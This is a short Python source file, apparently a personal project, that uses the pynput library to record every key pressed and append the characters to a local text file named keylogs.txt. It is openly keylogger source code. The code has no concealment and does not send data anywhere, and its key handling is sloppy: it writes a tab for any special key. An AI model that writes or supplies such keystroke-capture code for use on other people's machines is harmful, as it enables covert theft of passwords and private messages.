import os
import pynput
from pynput import keyboard

def on_press(key):
    print(str(key))
    with open("e:/Projects/Keylogger/keylogs.txt", 'a') as logkey:
        try:
           char = key.char   
           logkey.write(char)
            
        except:
            key == keyboard.Key.space
            logkey.write('\t')
                
        # finally:
        #    key == keyboard.Key.enter
        #    logkey.write('\n')    
                

if __name__ == "__main__":
    with keyboard.Listener(on_press=on_press) as listen:
        listen.join()             
         
         #  OR
               
    # Listener = keyboard.Listener(on_press=on_press)  # asking the listener to call this function on key press
    # Listener.start()
    # input()

  